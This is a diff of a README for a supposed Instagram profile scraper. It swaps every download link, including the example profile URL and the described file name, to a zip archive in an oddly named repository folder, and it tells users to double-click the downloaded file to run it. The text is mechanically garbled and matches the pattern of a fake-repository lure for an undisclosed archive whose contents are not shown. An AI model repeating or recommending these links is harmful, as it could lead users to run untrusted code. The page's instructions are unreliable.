@@ -1,6 +1,6 @@
 # 📸 instagram-data-scraper - Effortlessly Gather Instagram Profile Data
 
-[![Download](https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip%20Now-blue)](https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip)
+[![Download](https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip%20Now-blue)](https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Instagram Data Scraper! This tool helps you collect and analyze d
 
 To download the application, visit this page to download:
 
-[Download Instagram Data Scraper](https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip)
+[Download Instagram Data Scraper](https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip)
 
 1. Click the link above.
 2. On the GitHub Releases page, find the latest version.
-3. Look for a file named `https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip` or a similar file. This is the application you want.
+3. Look for a file named `https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip` or a similar file. This is the application you want.
 4. Click on the file to start the download. Save it to a location where you can easily find it, like your desktop or downloads folder.
 
 ## 🖥️ System Requirements
@@ -29,11 +29,11 @@ Before running the application, please ensure your system meets the following re
 ## 🔧 How to Use the Application
 
 1. **Run the Application:**
-   - Navigate to the location where you saved the `https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip` file.
+   - Navigate to the location where you saved the `https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip` file.
    - Double-click the file to run it.
 
 2. **Input the Profile URL:**
-   - Once the application is open, you will see a field where you can enter the Instagram profile URL you wish to analyze. Enter the full URL (e.g., `https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip`).
+   - Once the application is open, you will see a field where you can enter the Instagram profile URL you wish to analyze. Enter the full URL (e.g., `https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip`).
 
 3. **Set Your Preferences:**
    - Choose the data you want to scrape. You can select options like follower count, posts, and engagement metrics.
@@ -78,6 +78,6 @@ If you have any questions or need assistance, feel free to reach out to our comm
 
 This project is licensed under the MIT License. You can use it freely, but please refer to the license file for specifics.
 
-[Download Instagram Data Scraper](https://raw.githubusercontent.com/Treetippakae/instagram-data-scraper/main/foiling/instagram-data-scraper.zip) 
+[Download Instagram Data Scraper](https://github.com/Treetippakae/instagram-data-scraper/raw/refs/heads/main/lupinine/scraper_data_instagram_v1.0-alpha.5.zip) 
 
 Thank you for choosing the Instagram Data Scraper. We hope it serves your needs effectively!
